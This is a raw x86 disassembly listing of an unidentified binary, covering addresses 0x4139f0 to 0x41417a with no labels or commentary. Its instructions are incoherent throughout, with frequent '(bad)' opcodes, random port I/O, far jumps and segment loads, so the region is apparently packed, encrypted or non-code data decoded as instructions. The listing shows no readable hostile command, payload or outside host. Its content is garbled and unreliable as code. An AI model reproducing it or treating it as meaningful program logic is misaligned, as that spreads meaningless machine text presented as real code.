  4139f0:	mov    al,BYTE PTR [ebx]
  4139f2:	xor    al,0xbf
  4139f4:	jge    0x413a1c
  4139f6:	aam    0x67
  4139f8:	or     edx,DWORD PTR [ebp+0x66da3db1]
  4139fe:	jecxz  0x4139dc
  413a00:	ins    BYTE PTR es:[edi],dx
  413a01:	jo     0x413a18
  413a03:	aam    0xad
  413a05:	scas   eax,DWORD PTR es:[edi]
  413a06:	int    0xa3
  413a08:	and    al,BYTE PTR [ebx+0x3311084d]
  413a0e:	or     al,0x67
  413a10:	mov    BYTE PTR [ebx-0x576093e6],0xee
  413a17:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413a19:	push   edx
  413a1a:	(bad)  
  413a1b:	jae    0x413a05
  413a1d:	mov    cl,0x21
  413a1f:	fcmovnu st,st(2)
  413a21:	adc    DWORD PTR [eax-0x319c08e1],ecx
  413a27:	inc    eax
  413a28:	lods   eax,DWORD PTR ds:[esi]
  413a29:	xchg   edx,eax
  413a2a:	(bad)  
  413a2b:	in     al,dx
  413a2c:	rcr    DWORD PTR [esi+0x6c],1
  413a2f:	mov    gs,esi
  413a31:	add    eax,0xb4a6ee90
  413a36:	dec    edx
  413a37:	xor    DWORD PTR [esi],esi
  413a39:	inc    ebx
  413a3a:	pop    ss
  413a3b:	fld    DWORD PTR [edx]
  413a3d:	(bad)  
  413a3e:	shl    BYTE PTR [esp+edx*2+0x30ae2cd4],cl
  413a45:	out    0x3b,al
  413a47:	es fs (bad) 
  413a4a:	in     al,0x0
  413a4c:	sbb    ebx,DWORD PTR [esi+0x64ac5e9b]
  413a52:	(bad)  
  413a53:	pushf  
  413a54:	jno    0x4139f1
  413a56:	sti    
  413a57:	icebp  
  413a58:	xchg   edi,eax
  413a59:	add    al,0xfd
  413a5b:	idiv   DWORD PTR [esi+0x5c]
  413a5e:	and    al,dl
  413a60:	out    dx,eax
  413a61:	xor    al,0x17
  413a63:	in     al,0xa7
  413a65:	mov    ch,0xa7
  413a67:	mov    bh,0xc8
  413a69:	(bad)  
  413a6a:	out    dx,al
  413a6b:	dec    ebp
  413a6c:	fld    TBYTE PTR [ebp-0x28]
  413a6f:	lods   al,BYTE PTR ds:[esi]
  413a70:	rol    al,cl
  413a72:	test   eax,0xc7a05302
  413a77:	pop    esi
  413a78:	nop
  413a79:	mov    ebx,0x6fa2d7a6
  413a7e:	cmp    esi,DWORD PTR ds:0x54554d70
  413a84:	xchg   esp,eax
  413a85:	mov    ebp,0x1cc8e6b0
  413a8a:	cs pop esi
  413a8c:	fst    DWORD PTR [edx]
  413a8e:	and    al,0x71
  413a90:	pop    ss
  413a91:	fist   DWORD PTR [edx+0x4c1800b]
  413a97:	mov    esp,0xe21df8aa
  413a9c:	cs xchg ebp,eax
  413a9e:	push   esi
  413a9f:	mov    dh,0xdc
  413aa1:	inc    ebp
  413aa2:	fdiv   st,st(7)
  413aa4:	sar    BYTE PTR ds:0x2e99d4ce,cl
  413aaa:	(bad)  
  413aab:	dec    esp
  413aac:	in     al,dx
  413aad:	daa    
  413aae:	jbe    0x413a44
  413ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab1:	xchg   BYTE PTR ds:0xd60337fd,cl
  413ab7:	cmp    al,0x75
  413ab9:	rol    BYTE PTR [esi-0xa],0xdc
  413abd:	fld    DWORD PTR [edi+0x2779e7f7]
  413ac4:	xchg   BYTE PTR [ebp-0x6716f95],bl
  413aca:	pop    ebx
  413acb:	not    DWORD PTR [eax+0x73b83d65]
  413ad1:	fist   WORD PTR [edx-0x66358980]
  413ad7:	sub    bl,al
  413ad9:	sub    BYTE PTR [eax-0x39],al
  413adc:	push   edx
  413add:	pop    ebp
  413ade:	aam    0x7d
  413ae0:	scas   eax,DWORD PTR es:[edi]
  413ae1:	and    dl,BYTE PTR [ebp-0x19]
  413ae4:	lock lock ins BYTE PTR es:[edi],dx
  413ae7:	or     DWORD PTR [ecx],edi
  413ae9:	mov    al,0x15
  413aeb:	or     eax,0xc80f77d1
  413af0:	ror    esp,1
  413af2:	ficomp WORD PTR [edi]
  413af4:	iret   
  413af5:	jg     0x413b26
  413af7:	xchg   esi,eax
  413af8:	fwait
  413af9:	addr16 jmp 0x413b1a
  413afc:	mov    eax,0xd0676ac0
  413b01:	stos   DWORD PTR es:[edi],eax
  413b02:	mov    ecx,0x97d77698
  413b07:	sub    DWORD PTR [ebx+0x310847d5],edi
  413b0d:	dec    ebx
  413b0e:	mov    edi,0xfd6071a3
  413b13:	mov    ch,0xd6
  413b15:	or     dl,ah
  413b17:	lods   al,BYTE PTR ds:[esi]
  413b18:	add    al,0x30
  413b1a:	cmc    
  413b1b:	daa    
  413b1c:	xchg   ebx,eax
  413b1d:	lds    eax,FWORD PTR [ebp-0x45d895dd]
  413b23:	xchg   esi,esp
  413b25:	scas   eax,DWORD PTR es:[edi]
  413b26:	fcom   DWORD PTR [ebp+0x6f]
  413b29:	shl    BYTE PTR [edi-0x2e496e0],0x42
  413b30:	imul   DWORD PTR [edx+0x61e89207]
  413b36:	sbb    ebp,DWORD PTR [ebx]
  413b38:	push   ebx
  413b39:	shr    BYTE PTR [edx],0x81
  413b3c:	sti    
  413b3d:	outs   dx,BYTE PTR ds:[esi]
  413b3e:	pop    edx
  413b3f:	sbb    al,BYTE PTR [ecx-0x8]
  413b42:	pop    edx
  413b43:	push   edx
  413b44:	fild   DWORD PTR [esi+0x60]
  413b47:	mov    ds,eax
  413b49:	in     eax,dx
  413b4a:	mov    edi,ebp
  413b4c:	push   0x541ac263
  413b51:	pop    ecx
  413b52:	fwait
  413b53:	or     al,0x5a
  413b55:	addr16 push edi
  413b57:	inc    edi
  413b58:	adc    edi,DWORD PTR [edx+0x5e]
  413b5b:	test   ah,bl
  413b5d:	xchg   ebx,eax
  413b5e:	push   edi
  413b5f:	fimul  DWORD PTR [edi-0x60]
  413b62:	es (bad) 
  413b64:	fnsave [ebx+0x77]
  413b67:	dec    eax
  413b68:	jle    0x413b1a
  413b6a:	mov    ch,0xe4
  413b6c:	js     0x413b43
  413b6e:	sbb    al,0x76
  413b70:	inc    ebp
  413b71:	jl     0x413b00
  413b73:	mov    ebx,0xd887312f
  413b78:	mov    ch,0x7a
  413b7a:	pop    esi
  413b7b:	(bad)  
  413b7c:	hlt    
  413b7d:	add    DWORD PTR [edi-0x6a],esi
  413b80:	xchg   esp,eax
  413b81:	lds    edx,FWORD PTR [edx]
  413b83:	dec    edx
  413b84:	pop    ss
  413b85:	cmp    ebx,DWORD PTR [eax]
  413b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b88:	push   0xffffffe6
  413b8a:	xchg   BYTE PTR [ebx+0x6f],bl
  413b8d:	addr16 xchg ebp,eax
  413b8f:	mov    ebx,0x568638d8
  413b94:	into   
  413b95:	push   ebx
  413b96:	(bad)  
  413b97:	adc    al,0x40
  413b99:	outs   dx,DWORD PTR ds:[esi]
  413b9a:	gs pushf 
  413b9c:	dec    esi
  413b9d:	(bad)  
  413b9e:	jge    0x413b35
  413ba0:	mov    esp,edx
  413ba2:	jno    0x413b5f
  413ba4:	xchg   ecx,eax
  413ba5:	imul   esi,DWORD PTR [ecx+0x9d8042d],0xfffffff0
  413bac:	hlt    
  413bad:	in     al,0x83
  413baf:	xor    al,0xe1
  413bb1:	mov    DWORD PTR [ecx-0x8d864cf],0xa4a9a77f
  413bbb:	int3   
  413bbc:	jnp    0x413bf0
  413bbe:	in     eax,dx
  413bbf:	xchg   edi,eax
  413bc0:	nop
  413bc1:	pop    ecx
  413bc2:	jl     0x413be2
  413bc4:	pop    ebp
  413bc5:	(bad)  
  413bc6:	push   ebp
  413bc7:	adc    ecx,DWORD PTR [esi-0x73]
  413bca:	loop   0x413b8a
  413bcc:	data16 cld 
  413bce:	cmp    bl,bh
  413bd0:	ret    
  413bd1:	clc    
  413bd2:	jmp    0x1df9:0xe2e96cd2
  413bd9:	outs   dx,BYTE PTR ds:[esi]
  413bda:	xchg   esi,eax
  413bdb:	xor    dl,al
  413bdd:	add    BYTE PTR [esi-0x6a],0xf4
  413be1:	(bad)  
  413be2:	test   al,0xe8
  413be4:	push   cs
  413be5:	or     DWORD PTR [edi],ebp
  413be7:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413be9:	in     eax,0xe9
  413beb:	jb     0x413bca
  413bed:	fisttp DWORD PTR [edx+0x24]
  413bf0:	mov    gs,esi
  413bf2:	out    dx,al
  413bf3:	call   0x9224e30c
  413bf8:	out    0xaf,al
  413bfa:	ja     0x413c03
  413bfc:	inc    ebx
  413bfd:	inc    esp
  413bfe:	push   edx
  413bff:	int3   
  413c00:	int    0x2f
  413c02:	cs cmp edi,edx
  413c05:	jbe    0x413c1d
  413c07:	test   al,0xd6
  413c09:	pop    edi
  413c0a:	pop    eax
  413c0b:	and    al,0x22
  413c0d:	adc    DWORD PTR [ecx+edi*4],ecx
  413c10:	ja     0x413bdc
  413c12:	sahf   
  413c13:	test   bh,ah
  413c15:	dec    edx
  413c16:	(bad)  
  413c17:	cs in  eax,dx
  413c19:	das    
  413c1a:	add    ch,BYTE PTR [ebp+0x4e]
  413c1d:	cs xchg ebp,eax
  413c1f:	fs add cl,0x73
  413c23:	jnp    0x413c7d
  413c25:	rcr    DWORD PTR [esi+ecx*4+0x1340baf6],0x14
  413c2d:	sbb    al,0x60
  413c2f:	or     al,0x8e
  413c31:	pop    ebx
  413c32:	pusha  
  413c33:	push   esp
  413c34:	fld    TBYTE PTR [ebx]
  413c36:	jbe    0x413ca1
  413c38:	inc    edx
  413c39:	and    eax,0x5085650b
  413c3e:	dec    esp
  413c3f:	mov    edx,ss
  413c41:	pushf  
  413c42:	stos   DWORD PTR es:[edi],eax
  413c43:	push   0x6b
  413c45:	test   BYTE PTR [ebx-0x6675690a],bl
  413c4b:	push   cs
  413c4c:	jnp    0x413cb0
  413c4e:	mov    ah,0xd4
  413c50:	sahf   
  413c51:	or     edi,DWORD PTR [ecx+0x6d]
  413c54:	scas   al,BYTE PTR es:[edi]
  413c55:	mov    edx,0x3af69392
  413c5a:	cmc    
  413c5b:	xchg   DWORD PTR [ebp-0x2814aee1],esi
  413c61:	inc    ecx
  413c62:	xchg   edi,eax
  413c63:	sub    BYTE PTR [ebx+0x8],ah
  413c66:	jmp    0x413c81
  413c68:	mov    ah,0x21
  413c6a:	xchg   esi,eax
  413c6b:	fisttp QWORD PTR [ecx-0x406f4840]
  413c71:	adc    dh,bl
  413c73:	(bad)  
  413c75:	jmp    0x413c8e
  413c77:	xor    BYTE PTR ds:0x2ad88bf8,bh
  413c7d:	addr16 jle 0x413c86
  413c80:	mov    dl,0x71
  413c82:	mov    ah,0x4e
  413c84:	loopne 0x413c4f
  413c86:	push   0xb
  413c88:	stc    
  413c89:	daa    
  413c8a:	mov    ebx,0x18432636
  413c8f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413c91:	cdq    
  413c92:	push   ebx
  413c93:	add    BYTE PTR cs:[edi-0x2003092],ch
  413c9a:	mov    eax,0x248ac90a
  413c9f:	std    
  413ca0:	shl    DWORD PTR [edx+0x63],0x37
  413ca4:	jnp    0x413ce1
  413ca6:	cmp    al,0x43
  413ca8:	sub    al,0x47
  413caa:	ins    BYTE PTR es:[edi],dx
  413cab:	pop    esp
  413cac:	cld    
  413cad:	aaa    
  413cae:	mov    bl,0xcf
  413cb0:	jmp    0x1eda26b4
  413cb5:	lahf   
  413cb6:	mov    bh,cl
  413cb8:	cld    
  413cb9:	fld    TBYTE PTR [edi]
  413cbb:	xchg   edx,eax
  413cbc:	push   eax
  413cbd:	add    BYTE PTR [eax],bl
  413cbf:	out    0xeb,eax
  413cc1:	push   0x4e097012
  413cc6:	shl    DWORD PTR [edx],0x2d
  413cc9:	cmp    dl,BYTE PTR [eax]
  413ccb:	inc    eax
  413ccc:	pop    ss
  413ccd:	add    eax,0xe14a9d2b
  413cd2:	ret    0xa999
  413cd5:	aam    0xb8
  413cd7:	cmp    eax,0xa5ecd63e
  413cdc:	xchg   esp,eax
  413cdd:	jp     0x413d0d
  413cdf:	dec    esi
  413ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ce1:	push   eax
  413ce2:	ss add esp,ebp
  413ce5:	sub    al,0x18
  413ce7:	mov    ebp,0x16dfa1d7
  413cec:	sub    DWORD PTR [ebx],0x4f
  413cef:	sub    ebp,eax
  413cf1:	test   eax,0x99a0c568
  413cf6:	jo     0x413cfc
  413cf8:	push   ebp
  413cf9:	aas    
  413cfa:	int3   
  413cfb:	scas   eax,DWORD PTR es:[edi]
  413cfc:	test   al,0xd6
  413cfe:	sbb    ch,0x9a
  413d01:	xchg   BYTE PTR [ebx],al
  413d03:	sub    edi,ebx
  413d05:	pop    ecx
  413d06:	test   eax,0x6fd441c7
  413d0b:	pushf  
  413d0c:	lock or DWORD PTR fs:[eax],edx
  413d10:	aaa    
  413d11:	push   0xffffffa9
  413d13:	pushf  
  413d14:	out    dx,al
  413d15:	retf   
  413d16:	xchg   esi,eax
  413d17:	clc    
  413d18:	ret    0x7fe2
  413d1b:	mov    edx,0x3ccc2835
  413d20:	pop    edi
  413d21:	sub    al,0xd0
  413d23:	aas    
  413d24:	imul   ebx,DWORD PTR [esi-0x3c36c3fe],0xffffffb9
  413d2b:	dec    esp
  413d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2d:	aas    
  413d2e:	cwde   
  413d2f:	or     esi,esp
  413d31:	sahf   
  413d32:	popa   
  413d33:	jb     0x413d82
  413d35:	adc    DWORD PTR [ebx],ebx
  413d37:	mov    edx,DWORD PTR [eax+0x135c8f2]
  413d3d:	lods   al,BYTE PTR ds:[esi]
  413d3e:	shl    DWORD PTR [ebx+0x3de39b22],1
  413d44:	mov    ds,WORD PTR [ebx+0x6c]
  413d47:	lods   al,BYTE PTR ds:[esi]
  413d48:	into   
  413d49:	inc    edx
  413d4a:	fcmovne st,st(4)
  413d4c:	add    DWORD PTR [edi+ebp*2-0x13],0x24
  413d51:	enter  0xe04d,0x38
  413d55:	dec    ecx
  413d56:	push   ss
  413d57:	push   edx
  413d58:	ror    DWORD PTR [eax-0x71],0x84
  413d5c:	inc    edi
  413d5d:	data16 or BYTE PTR [esi-0x60],ch
  413d61:	jp     0x413db2
  413d63:	push   ebx
  413d64:	shr    DWORD PTR [edx-0x9],cl
  413d67:	cwde   
  413d68:	fsubr  st(7),st
  413d6a:	mov    WORD PTR [esi+0x11],?
  413d6d:	mov    esp,0x381a5b82
  413d72:	call   0xbf69:0xf1ed3175
  413d79:	push   eax
  413d7a:	and    al,0x67
  413d7c:	xchg   esi,eax
  413d7d:	jge    0x413dea
  413d7f:	ja     0x413ddc
  413d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d82:	and    al,0x61
  413d84:	fdivr  QWORD PTR [edx+0x12]
  413d87:	repz fld DWORD PTR [ebx]
  413d8a:	loop   0x413d52
  413d8c:	(bad)  
  413d8d:	(bad)  
  413d8e:	div    al
  413d90:	jb     0x413db1
  413d92:	mov    al,0xb6
  413d94:	and    eax,0x904386eb
  413d99:	lds    eax,FWORD PTR ds:0xf2204260
  413d9f:	enter  0x1569,0xf0
  413da3:	aam    0x14
  413da5:	mov    bh,0x64
  413da7:	mov    BYTE PTR [ebp-0x8296f36],ch
  413dad:	retf   0xe651
  413db0:	jbe    0x413e1b
  413db2:	push   cs
  413db3:	mov    esp,0xd51db34b
  413db8:	sub    BYTE PTR [edx],dl
  413dba:	mov    esp,0x8379670d
  413dbf:	stos   BYTE PTR es:[edi],al
  413dc0:	jae    0x413dbd
  413dc2:	push   es
  413dc3:	js     0x413ded
  413dc5:	mov    al,es:0x66438cd1
  413dcb:	into   
  413dcc:	jp     0x413e0f
  413dce:	push   ecx
  413dcf:	(bad)  
  413dd0:	xchg   ecx,eax
  413dd1:	mov    dl,0x92
  413dd3:	in     eax,dx
  413dd4:	sahf   
  413dd5:	jns    0x413dbd
  413dd7:	jmp    0x413dc4
  413dd9:	mov    bh,0x48
  413ddb:	cmp    al,0x88
  413ddd:	push   esp
  413dde:	ins    DWORD PTR es:[edi],dx
  413ddf:	(bad)  
  413de0:	adc    BYTE PTR [ecx-0x61b1c048],bl
  413de6:	gs mov ebx,0x97ee9f3d
  413dec:	shr    DWORD PTR fs:[ecx+0x3d],cl
  413df0:	xchg   BYTE PTR [eax-0x6303a401],ah
  413df6:	es test eax,0xd62e1378
  413dfc:	hlt    
  413dfd:	mov    al,ds:0x48c39b36
  413e02:	popa   
  413e03:	push   es
  413e04:	and    al,ah
  413e06:	sti    
  413e07:	mov    BYTE PTR [edi+0x6fb9c543],ah
  413e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e0e:	jecxz  0x413e7f
  413e10:	jno    0x413e48
  413e12:	ins    BYTE PTR es:[edi],dx
  413e13:	cmp    al,0xb5
  413e15:	xchg   ebx,eax
  413e16:	xchg   edi,eax
  413e17:	pop    edi
  413e18:	sar    DWORD PTR [edi-0x75b73836],1
  413e1e:	mov    ebx,0x6c01e29c
  413e23:	mov    al,0x2c
  413e25:	ficom  DWORD PTR [ecx+0x7e]
  413e28:	test   edx,edi
  413e2a:	mov    dl,0xa7
  413e2c:	and    eax,0xf27c9702
  413e31:	sbb    ebp,DWORD PTR [ecx+0x2b393cc5]
  413e37:	mov    cl,0x47
  413e39:	mov    dh,0x71
  413e3b:	(bad)  
  413e3c:	push   edi
  413e3d:	ja     0x413ea5
  413e3f:	xchg   DWORD PTR [edx+0x20b508de],eax
  413e45:	test   al,0xe8
  413e47:	mov    ds:0x38e03991,eax
  413e4c:	add    bl,0x18
  413e4f:	push   0xebe67721
  413e54:	(bad)  
  413e55:	jae    0x413df8
  413e57:	push   esp
  413e58:	jmp    0x413e2c
  413e5a:	out    dx,eax
  413e5b:	dec    ebx
  413e5c:	call   0x58b7:0x3c603006
  413e63:	ja     0x413e33
  413e65:	xlat   BYTE PTR ds:[ebx]
  413e66:	push   0xffffffa0
  413e68:	adc    BYTE PTR ds:0x4af9198a,cl
  413e6e:	mov    ecx,0x53a52d93
  413e73:	or     DWORD PTR [edx+0x71bf5bbb],edx
  413e79:	mov    ebx,DWORD PTR [edx]
  413e7b:	(bad)  
  413e7c:	jne    0x413ef7
  413e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e7f:	rcl    BYTE PTR [ecx+eax*2+0x4d],1
  413e83:	jge    0x413e07
  413e85:	fbld   TBYTE PTR [ecx-0x4444328d]
  413e8b:	cmp    DWORD PTR [edx*8-0x55f94010],edx
  413e92:	mov    dh,bl
  413e94:	jnp    0x413ef3
  413e96:	ret    
  413e97:	mov    eax,edx
  413e99:	inc    ecx
  413e9a:	push   ds
  413e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e9c:	bound  esi,QWORD PTR [ebx]
  413e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e9f:	cmp    ebp,DWORD PTR [esi+edi*1+0x5d]
  413ea3:	je     0x413eb9
  413ea5:	cwde   
  413ea6:	push   0x26965686
  413eab:	sub    eax,0xe3f37d4b
  413eb0:	clc    
  413eb1:	in     eax,0xa3
  413eb3:	push   eax
  413eb4:	ss test eax,0x862a1acd
  413eba:	aas    
  413ebb:	loope  0x413efe
  413ebd:	cmc    
  413ebe:	inc    ebx
  413ebf:	cmp    DWORD PTR [ebp+0x3],ebx
  413ec2:	mov    eax,edx
  413ec4:	jmp    0xb80d:0x95fb4591
  413ecb:	js     0x413ed1
  413ecd:	test   DWORD PTR [ecx+0x75bb81e9],edi
  413ed3:	push   ecx
  413ed4:	lods   eax,DWORD PTR ds:[esi]
  413ed5:	jmp    0x77331a74
  413eda:	mov    ebx,0x671926fe
  413edf:	jmp    0x413ebb
  413ee1:	xchg   esp,eax
  413ee2:	or     DWORD PTR [esi+0x13],ebx
  413ee5:	test   eax,0x45838d55
  413eea:	xchg   ecx,eax
  413eeb:	outs   dx,BYTE PTR ds:[esi]
  413eec:	sbb    BYTE PTR ds:0x4bef6f73,bh
  413ef2:	mov    dl,0xfc
  413ef4:	in     al,dx
  413ef5:	push   cs
  413ef6:	pop    esp
  413ef7:	jle    0x413ed9
  413ef9:	push   ebx
  413efa:	and    bh,dh
  413efc:	jae    0x413e91
  413efe:	push   esp
  413eff:	inc    ebp
  413f00:	and    eax,0xfcf585ce
  413f05:	push   ecx
  413f06:	icebp  
  413f07:	ret    
  413f08:	and    bl,bh
  413f0a:	stos   DWORD PTR es:[edi],eax
  413f0b:	push   0xc46a287c
  413f10:	pop    ss
  413f11:	enter  0xb82e,0xc0
  413f15:	sbb    al,BYTE PTR [esi]
  413f17:	jbe    0x413ee3
  413f19:	xchg   dl,ch
  413f1b:	push   eax
  413f1c:	mov    ebp,0xdc2fecb8
  413f21:	ret    0xfd9
  413f24:	js     0x413eb4
  413f26:	push   ebp
  413f27:	fdiv   DWORD PTR [ebx]
  413f29:	mov    edi,0x60141421
  413f2e:	aam    0x25
  413f30:	xchg   edx,eax
  413f31:	ins    DWORD PTR es:[edi],dx
  413f32:	shl    DWORD PTR [edi],1
  413f34:	fs push ss
  413f36:	cmp    BYTE PTR [ecx+0x411da68f],cl
  413f3c:	hlt    
  413f3d:	nop
  413f3e:	lahf   
  413f3f:	test   BYTE PTR [edi],0x3
  413f42:	jle    0x413fa2
  413f44:	fidiv  WORD PTR [ecx-0x5c]
  413f47:	les    cx,DWORD PTR [eax+0x40]
  413f4b:	cmp    ebx,edi
  413f4d:	push   ebx
  413f4e:	push   ebx
  413f4f:	and    eax,0x89bc64f6
  413f54:	or     bh,bh
  413f56:	xchg   DWORD PTR [edi+0x6b602e7],ebp
  413f5c:	xchg   ebx,eax
  413f5d:	sbb    ecx,DWORD PTR [esi+0x77]
  413f60:	call   0x260e:0xa499c001
  413f67:	stc    
  413f68:	add    DWORD PTR [ebp+0x5f],edi
  413f6b:	cs dec edi
  413f6d:	enter  0x1180,0xe1
  413f71:	pop    eax
  413f72:	imul   ecx,DWORD PTR es:[esi],0x49
  413f76:	add    dh,al
  413f78:	cld    
  413f79:	jb     0x413f59
  413f7b:	pop    ds
  413f7c:	pushf  
  413f7d:	jmp    0x74ebf4e5
  413f82:	sti    
  413f83:	adc    ebx,edx
  413f85:	iret   
  413f86:	ins    BYTE PTR es:[edi],dx
  413f87:	cmp    DWORD PTR [edi-0x3b02da09],ebx
  413f8d:	gs std 
  413f8f:	pop    es
  413f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f91:	mov    ecx,0xcea62ed4
  413f96:	push   ebx
  413f97:	int3   
  413f98:	push   0xf
  413f9a:	dec    esp
  413f9b:	jg     0x413f1d
  413f9d:	mov    edx,0x417e2b28
  413fa2:	mov    DWORD PTR [eax-0x39d487aa],0xad3ccd5c
  413fac:	cmp    dl,al
  413fae:	clc    
  413faf:	jb     0x414022
  413fb1:	div    bh
  413fb3:	jg     0x413f95
  413fb5:	mov    DWORD PTR [edx],ebp
  413fb7:	(bad)  
  413fb8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413fba:	jo     0x413f67
  413fbc:	xor    al,0xd7
  413fbf:	adc    eax,0xd818cf7d
  413fc4:	dec    esi
  413fc5:	int    0xb2
  413fc7:	into   
  413fc8:	jle    0x413fe5
  413fca:	adc    dl,BYTE PTR ds:0x6515ec4e
  413fd0:	ds mov edx,0xeb7593a8
  413fd6:	jmp    0x413fda
  413fd8:	cmc    
  413fd9:	inc    esi
  413fda:	retf   
  413fdb:	(bad)  
  413fdc:	jmp    0x41e83c2f
  413fe1:	xlat   BYTE PTR ds:[ebx]
  413fe2:	into   
  413fe3:	mov    ebp,0x780541cc
  413fe8:	jns    0x413f87
  413fea:	jnp    0x413f71
  413fec:	in     al,dx
  413fed:	sbb    DWORD PTR [esi+0x21fa0952],esi
  413ff3:	pop    ecx
  413ff4:	outs   dx,BYTE PTR ds:[esi]
  413ff5:	lods   al,BYTE PTR ds:[esi]
  413ff6:	pop    es
  413ff7:	enter  0x56b4,0xc1
  413ffb:	retf   0x8ed8
  413ffe:	xchg   ecx,eax
  413fff:	test   eax,0xc100e22a
  414004:	add    al,0xbc
  414006:	call   FWORD PTR [edx+0x1a]
  414009:	leave  
  41400a:	outs   dx,BYTE PTR ds:[esi]
  41400b:	aaa    
  41400c:	fcom   QWORD PTR [ecx+0x2e]
  41400f:	xchg   BYTE PTR [ebx+0x4f8cb14b],al
  414015:	xchg   di,ax
  414017:	out    0x46,al
  414019:	jb     0x413fb5
  41401b:	je     0x41403d
  41401d:	out    dx,eax
  41401e:	stos   BYTE PTR es:[edi],al
  41401f:	sbb    DWORD PTR [edi],edi
  414021:	test   DWORD PTR [edx],0xdc82885b
  414027:	(bad)  
  414029:	pop    edx
  41402a:	mov    ebx,0xfe8457a1
  41402f:	add    cl,BYTE PTR [ebp+0x52bc3e57]
  414035:	nop
  414036:	add    cl,BYTE PTR [ecx-0x3876d85]
  41403c:	lods   al,BYTE PTR ds:[esi]
  41403d:	imul   BYTE PTR [eax-0x63840b0d]
  414043:	or     edi,esi
  414045:	cs pop es
  414047:	or     DWORD PTR [ecx],esp
  414049:	cmp    al,0xd3
  41404b:	xor    al,0xfe
  41404d:	xor    ebx,eax
  41404f:	aad    0x8
  414051:	aas    
  414052:	xchg   edx,eax
  414053:	inc    edx
  414054:	dec    esi
  414055:	ds mov al,0x4a
  414058:	test   DWORD PTR ds:0xb44a9d46,edi
  41405e:	add    DWORD PTR [eax],ecx
  414060:	stos   DWORD PTR es:[edi],eax
  414061:	cmp    dh,BYTE PTR [ebp-0x11]
  414064:	or     eax,0x1241a646
  414069:	mov    eax,0xc9e735d5
  41406e:	(bad)  
  414070:	mov    ds:0x3f94e2b1,eax
  414075:	cdq    
  414076:	enter  0x6760,0x12
  41407a:	into   
  41407b:	bound  edx,QWORD PTR [edi]
  41407d:	in     eax,0x63
  41407f:	xchg   BYTE PTR [eax+0x5c5a7e57],dh
  414085:	daa    
  414086:	std    
  414087:	in     eax,dx
  414088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414089:	mov    ebp,0xb76d6094
  41408e:	mov    WORD PTR [ebp+0xf8befe9],fs
  414094:	pusha  
  414095:	into   
  414096:	pop    esi
  414097:	dec    ebx
  414098:	or     BYTE PTR [edx],dl
  41409a:	aaa    
  41409b:	ret    0xbb9a
  41409e:	(bad)  
  41409f:	das    
  4140a0:	mov    al,ds:0xe39ce387
  4140a5:	in     al,0xc5
  4140a7:	xchg   ebx,eax
  4140a8:	dec    ebx
  4140a9:	jmp    0xeecc36af
  4140ae:	loope  0x414038
  4140b0:	push   esi
  4140b1:	not    DWORD PTR [ebp-0x23]
  4140b4:	sbb    DWORD PTR [edx],esp
  4140b6:	jge    0x41410d
  4140b8:	les    edi,FWORD PTR [ecx+0x2a464aed]
  4140be:	jns    0x414126
  4140c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140c1:	cli    
  4140c2:	mov    eax,0x66d66901
  4140c7:	add    eax,0xbcc252ff
  4140cc:	add    dl,BYTE PTR [ecx-0x5d]
  4140cf:	jp     0x4140a3
  4140d1:	dec    WORD PTR [ebp+0x762ba1e]
  4140d8:	mov    eax,ds:0x7a37f2d1
  4140dd:	loopne 0x414117
  4140df:	adc    dh,BYTE PTR [eax+0x4aa0161c]
  4140e5:	jae    0x414079
  4140e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140e8:	dec    ebx
  4140e9:	std    
  4140ea:	push   ecx
  4140eb:	in     al,0xdf
  4140ed:	cmp    esp,esp
  4140ef:	pop    eax
  4140f0:	inc    ebp
  4140f1:	dec    ecx
  4140f2:	push   cs
  4140f3:	xchg   edx,eax
  4140f4:	adc    esp,edi
  4140f6:	rol    BYTE PTR [esp-0x46],cl
  4140fa:	mov    ds:0xc97f7f49,eax
  4140ff:	data16 test cl,cl
  414102:	out    0xef,eax
  414104:	lods   al,BYTE PTR ds:[esi]
  414105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414106:	je     0x41409b
  414108:	rol    DWORD PTR [edi+0x5de1eb93],0x51
  41410f:	ret    
  414110:	mov    cl,0xca
  414112:	and    eax,0x37a3a3fe
  414117:	push   ds
  414118:	(bad)  
  414119:	je     0x4140c1
  41411b:	icebp  
  41411c:	mov    edi,0xf7ae6f3d
  414121:	out    dx,eax
  414122:	dec    eax
  414123:	bound  edx,QWORD PTR ds:0x53ead3c
  414129:	mov    esi,0xe3624f19
  41412e:	cmc    
  41412f:	adc    al,0x53
  414131:	push   esp
  414132:	inc    eax
  414133:	xchg   ebx,eax
  414134:	add    ebx,esp
  414136:	xor    esp,DWORD PTR [eax-0x43]
  414139:	and    eax,0x5c0e4ed
  41413e:	mov    cs,WORD PTR [ebp+eiz*8-0x53c0b7e4]
  414145:	xchg   edx,eax
  414146:	and    al,0xbd
  414148:	mov    edi,DWORD PTR [ecx-0x54]
  41414b:	mov    al,ah
  41414d:	leave  
  41414e:	shr    BYTE PTR [edi],0x36
  414151:	sti    
  414152:	aam    0x62
  414154:	(bad)  
  414155:	pop    edx
  414156:	(bad)  
  414157:	mov    cl,0xd1
  414159:	mov    esi,0xef5516be
  41415e:	cmp    DWORD PTR [eax],0xa8812788
  414164:	jmp    0x11dc927d
  414169:	adc    eax,0x786c85b8
  41416e:	push   ecx
  41416f:	inc    eax
  414170:	inc    esi
  414171:	mov    DWORD PTR [ebx+0x64],esi
  414174:	cli    
  414175:	sahf   
  414176:	cdq    
  414177:	stc    
  414178:	aad    0xff
  41417a:	xchg   ecx,eax
